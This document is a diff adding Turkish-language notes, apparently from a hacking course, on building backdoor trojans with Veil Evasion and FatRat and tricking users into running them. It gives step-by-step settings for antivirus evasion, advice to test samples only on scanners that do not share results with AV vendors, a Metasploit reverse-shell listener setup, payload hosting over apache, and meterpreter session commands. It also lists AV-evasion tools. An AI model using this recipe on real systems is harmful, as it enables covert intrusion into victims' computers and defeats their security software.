@@ -1,0 +1,132 @@
+	ATTACKING USERS
+ Trojan'ın bir türü olan Backdoor'u kullanacağız.
+ Kötü niyetli hackerlar genelde yanlış kurulmuş bir hata, açıklar ile karşılaşmazlar.
+ Onun yerine Trojan dediğimiz bazı zararlı exe'ler(dosyalar) kullanırlar.
+ Hacklemek istediğimiz kişiye bu exe dosyasını yollarsanız ve bir şekilde bu dosyayı ona açtırırsanız,
+ Kullanıcı Hacker'a kendi bilgisayarında bir erişim vermiş olur.
+ Virüs programları bu tarz dosyalar geldiğinde kullanıcıları uyarır.
+ Veil, trojanları oluşturur ve antivirüs programlarından kaçmak için birçok teknik kullanır.
+ Veil bir tool'dur.
+
+
+
+	VEIL
+<Terminal> cd /opt/Veil/python3 Veil.py
+
+ list yazarsak hazırda kullanabileceğimiz araçları görebiliriz.
+ trojanları, backdoorları yarattığımız araç "Evasion"dur.
+ Evasion'u açmak için "use 1" yazmamız gerekiyor.
+ Tekrar list yazarsak payload'ları görebiliriz.
+ satırların sonunda yazan (rev_http.py) gibi, reverse ters bağlantı demektir ben hedef bilgisayara değil o bana bağlanacak.
+ Bizim bağlanmama sebebimiz Antivirüs programları vs.
+ Bunlardan birini kullanarak ilk trojanımızı, backdoor'umuzu yaratalım. :)
+ Herhangi birini "use" komutuyla seçelim. (use 14)
+ set LHOST 10.0.2.10	-> LHOST'u kendi ip'miz olarak değiştirdik. (ifconfig)
+ set LPORT 8080		-> LPORT'u 8080 olarak değiştirdik çünkü 80'i kullanan portumuz var.
+ "options" yazarak ayarları görebiliriz.
+ generate yazarak isim verdikten sonra Enter'a basarak trojanımızı yaratabiliriz.
+
+
+
+
+
+	Trojanlarımızı Nerede ve Nasıl test ederiz?
+ Trojanımızı test etmek için tarayıcımızdan "Malware scan" diye aratmamız yeterli olacaktır.
+ Oluşturduğumuz virüsleri burada deneyebiliriz. Ama bazı siteler trojanımızı anti-virüs şirketlerine iletir. :(
+ Sonuçlarımızı paylaşmayacak bir siteye girelim. "online virus scanner without result distribution"
+ Oluşturduğumuz trojan 9 tane antivirüs programından geçti.
+
+ -> virustotal		-> AV Programları ile paylaşır.
+ -> jotti		-> AV Programları ile paylaşır.
+ -> antiscan.me		-> AV Programları ile paylaşmaz. :)
+ -> nodistribute	-> AV Programları ile paylaşmaz. :)
+ Gibi siteler işimizi görecektir.
+
+
+
+
+
+	Antivirüs programlarına yakalanmayı nasıl minimize ederiz?
+ Ne kadar çok ayar değiştirisek o kadar fazla minimize ederiz. :)
+ Tekrar Veil/Evasion'u kullanalım.
+  Şimdi daha fazla ayarı değiştirelim.
+
+ -BullDOGTrojan- for Ruby
+set COMPILE_TO_EXE N
+set DOMAIN A
+set LHOST 10.0.2.10
+set LPORT 124
+set SLEEP 31
+set INJECT_METHOD Heap
+set USERNAME XHAX
+ 50 Antivirüs programından Microsoft hariç tüm programları başarıyla geçti. :)
+
+
+
+
+	TROJANIMIZI NASIL KULLANIRIZ?
+ Herhangi bir kişiyi kandırarak trojanımızı aktif hale getirebilirsek, gelen bağlantıları halihazırda dinliyor olmamız lazım.
+ Bunun için msfconsole aracını kullanacağız.
+ msfconsole aracını açmak için: (msfconsole'u açamazsan buraya girip çalıştırmayı dene -> cd /usr/share/)
+
+msfconsole
+use exploit/multi/handler	-> Bu modül bizim birçok yerde gelen bağlantıları hundle etmemizi (yönetmemizi) sağlıyor.
+set PAYLOAD windows/meterpreter/reverse_http
+		   <Session adı>
+show options
+set LHOST 10.0.2.10	-> Kendi ip'mizi ekledik.
+exploit			-> Şuanda gelen bağlantıları dinliyor. Bir bağlantı bulursa otomatik olarak session'umuzu açacaktır.
+
+ Yeni bir terminale:
+service apache2 start -> yazarak websitemizi diğer bilgisayarlardan ulaşılabilir hale getiriyoruz.
+ Hedef bilgisayarımız tarayıcısından 10.0.2.10/backdoors adresine girerse ve Trojanımızı indirirse bize bir bağlantı göndermiş olacaktır.
+ Kalimize döndüğümüzde Meterpreter session'ımız uyanmış olacaktır çünkü bağlantı aldık.
+ Artık Hacklediğimiz Bilgisayarın içindeyiz. :)
+
+
+
+	:Alternative Best Tool:
+ https://github.com/Veil-Framework/Veil		Veil Framework
+ https://www.shellterproject.com/download/	Shellter AV Evasion Artware
+ https://github.com/trustedsec/unicorn		Trustedsec
+ https://github.com/g0tmi1k/msfpc		g0tm1k
+ https://github.com/r00t-3xp10it/venom		Pedro Ubuntu
+ https://github.com/oddcod3/Phantom-Evasion	Diego Cornacchini
+
+
+
+ Trojanımızı var/www/html/backdoors/ içine atıyoruz. -> Buraya atma sebebimiz kendi web server'ımızı çalıştırmak ve bu web server aracılığı ile trojanımızı hedef bilgisayara atmak.
+service apache2 start -> yazarak websitemizi diğer bilgisayarlardan ulaşılabilir hale getiriyoruz.
+ Hedef bilgisayarımız tarayıcısından 10.0.2.10/backdoors adresine girerse ve Trojanımızı indirirse bize bir bağlantı göndermiş olacaktır.
+ Kalimize döndüğümüzde Meterpreter session'ımız uyanmış olacaktır çünkü bağlantı aldık.
+ Artık Hacklediğimiz Bilgisayarın içindeyiz. :)
+
+
+
+
+	FATRAT
+ Terminale "fatrat" yazarak tool'umuzu açabiliriz.
+ şimdilik 2. seçeneği deneyelim. (2)
+ tekrardan 2. seçeneğe girelim. Yavaş ama güçlü
+ Set LHOST IP: yerine 10.0.2.10
+ Set LPORT: yerine 8080 (rastgele)
+ Yazıyoruz.
+
+ Tekrar karşımıza seçenek çıkıyor. Bu kısımda 1'i seçiyoru (32bit her 2sinde de çalışıyor.)
+ Sanal makinenin veya hedef bilgisayarın tarayıcısında 10.0.2.10/backdoors adresine giriyoruz.
+ Oluşturduğumuz trojanı indiriyoruz. (FaTrojan.exe) -> Defender Trojanı Engellemedi.
+ Kendi bilgisayarımızda service apache2 start yaptıktan sonra,
+ msfconsole'u açıyoruz. (msfconsole'u açamazsan buraya girip çalıştırmayı dene -> cd /usr/share/)
+
+msfconsole
+use exploit/multi/handler	-> Bu modül bizim birçok yerde gelen bağlantıları hundle etmemizi (yönetmemizi) sağlıyor.
+set payload windows/metepreter/reverse_tcp
+show options
+set LHOST 10.0.2.10
+set LPORT 8080
+exploit
+ Yazdıktan sonra sanal makinemizde indirmiş olduğumuz trojana girdikten sonra
+ Session'umuz uyanmış olacak ve hedef bilgisayara sızmış olacağız.
+sessions -l
+sessions -1	-> Yazarak meterpreter'ımıza girmiş olacağız.
+sysinfo		-> Çalıştırırsak windows10'umuzu hacklediğimizi görmüş olacağız.
